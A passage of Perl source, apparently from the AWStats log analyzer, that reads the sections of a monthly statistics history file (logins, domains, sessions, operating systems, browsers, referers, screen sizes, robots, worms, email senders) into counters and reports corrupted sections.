$field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_login_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_login_l{ $field[0] } && $field[4] ) {\n\t\t\t\t\t\t\t\t$_login_l{ $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_LOGIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_LOGIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_LOGIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_LOGIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section LOGIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of LOGIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'login'};\n\t\t\t\tif ( $SectionsToSave{'login'} ) {\n\t\t\t\t\tSave_History( 'login', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'login'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_login_p = ();\n\t\t\t\t\t\t%_login_h = ();\n\t\t\t\t\t\t%_login_k = ();\n\t\t\t\t\t\t%_login_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DOMAIN\n\t\t\tif ( $field[0] eq 'BEGIN_DOMAIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of DOMAIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'domain'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_domener_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_domener_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_domener_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DOMAIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DOMAIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_DOMAIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_DOMAIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DOMAIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DOMAIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'domain'};\n\t\t\t\tif ( $SectionsToSave{'domain'} ) {\n\t\t\t\t\tSave_History( 'domain', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'domain'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_domener_p = ();\n\t\t\t\t\t\t%_domener_h = ();\n\t\t\t\t\t\t%_domener_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SESSION\n\t\t\tif ( $field[0] eq 'BEGIN_SESSION' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SESSION section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'session'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_session{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SESSION'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SESSION\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SESSION'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SESSION\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SESSION not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SESSION section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'session'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'session'}) {\n#\tSave_History('session',$year,$month,$date); delete $SectionsToSave{'session'}; }\n#\tif ($withpurge) { %_session=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_OS\n\t\t\tif ( $field[0] eq 'BEGIN_OS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of OS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'os'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_os_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t$_os_p{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_OS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_OS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif ( $field[0] ne 'END_OS' && $field[0] ne \"${xmleb}END_OS\" ) {\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section OS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of OS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'os'};\n\t\t\t\tif ( $SectionsToSave{'os'} ) {\n\t\t\t\t\tSave_History( 'os', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'os'};\n\t\t\t\t\tif ($withpurge) { %_os_h = (); %_os_p = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_BROWSER\n\t\t\tif ( $field[0] eq 'BEGIN_BROWSER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of BROWSER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'browser'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_browser_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t$_browser_p{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_BROWSER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_BROWSER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_BROWSER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_BROWSER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section BROWSER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of BROWSER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'browser'};\n\t\t\t\tif ( $SectionsToSave{'browser'} ) {\n\t\t\t\t\tSave_History( 'browser', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'browser'};\n\t\t\t\t\tif ($withpurge) { %_browser_h = (); %_browser_p = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNREFERER\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNREFERER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of UNKNOWNREFERER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownreferer'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( !$_unknownreferer_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_unknownreferer_l{ $field[0] } =\n\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNREFERER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNREFERER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNREFERER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNREFERER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKNOWNREFERER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKNOWNREFERER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'unknownreferer'};\n\t\t\t\tif ( $SectionsToSave{'unknownreferer'} ) {\n\t\t\t\t\tSave_History( 'unknownreferer', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'unknownreferer'};\n\t\t\t\t\tif ($withpurge) { %_unknownreferer_l = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNREFERERBROWSER\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNREFERERBROWSER' ) {\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\" Begin of UNKNOWNREFERERBROWSER section\");\n\t\t\t\t}\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownrefererbrowser'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( !$_unknownrefererbrowser_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_unknownrefererbrowser_l{ $field[0] } =\n\t\t\t\t\t\t\t\t  int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNREFERERBROWSER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNREFERERBROWSER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'unknownrefererbrowser'};\n\t\t\t\tif ( $SectionsToSave{'unknownrefererbrowser'} ) {\n\t\t\t\t\tSave_History( 'unknownrefererbrowser',\n\t\t\t\t\t\t$year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'unknownrefererbrowser'};\n\t\t\t\t\tif ($withpurge) { %_unknownrefererbrowser_l = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SCREENSIZE\n\t\t\tif ( $field[0] eq 'BEGIN_SCREENSIZE' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SCREENSIZE section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'screensize'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_screensize_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SCREENSIZE'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SCREENSIZE\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SCREENSIZE'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SCREENSIZE\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SCREENSIZE not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SCREENSIZE section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'screensize'};\n\t\t\t\tif ( $SectionsToSave{'screensize'} ) {\n\t\t\t\t\tSave_History( 'screensize', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'screensize'};\n\t\t\t\t\tif ($withpurge) { %_screensize_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ROBOT\n\t\t\tif ( $field[0] eq 'BEGIN_ROBOT' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ROBOT section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'robot'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_robot_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_robot_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\tif ( !$_robot_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_robot_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$_robot_r{ $field[0] } += $field[4];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ROBOT'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ROBOT\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ROBOT'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ROBOT\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ROBOT not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ROBOT section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'robot'};\n\t\t\t\tif ( $SectionsToSave{'robot'} ) {\n\t\t\t\t\tSave_History( 'robot', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'robot'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_robot_h = ();\n\t\t\t\t\t\t%_robot_k = ();\n\t\t\t\t\t\t%_robot_l = ();\n\t\t\t\t\t\t%_robot_r = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_WORMS\n\t\t\tif ( $field[0] eq 'BEGIN_WORMS' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of WORMS section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'worms'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_worm_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_worm_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\tif ( !$_worm_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_worm_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_WORMS'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_WORMS\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_WORMS'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_WORMS\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section WORMS not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of WORMS section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'worms'};\n\t\t\t\tif ( $SectionsToSave{'worms'} ) {\n\t\t\t\t\tSave_History( 'worms', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'worms'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_worm_h = ();\n\t\t\t\t\t\t%_worm_k = ();\n\t\t\t\t\t\t%_worm_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_EMAILS\n\t\t\tif ( $field[0] eq 'BEGIN_EMAILSENDER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of EMAILSENDER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'emailsender'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_emails_h{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_emails_k{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_emails_l{ $field[0] } ) {\n\t\t\t\t\t\t\t\t$_emails_l{ $field[0] } = int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_EMAILSENDER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_EMAILSENDER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_EMAILSENDER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_EMAILSENDER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section EMAILSENDER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of EMAILSENDER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'emailsender'};\n\t\t\t\tif ( $SectionsToSave{'emailsender'} ) {\n\t\t\t\t\tSave_History( 'emailsender', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'emailsender'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_emails_h = ();\n\t\t\t\t\t\t%_emails_k = ();\n\t\t\t\t\t\t%_emails_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_EMAILR\n\t\t\tif ( $field[0] eq 'BEGIN_EMAILRECEIVER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of EMAILRECEIVER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 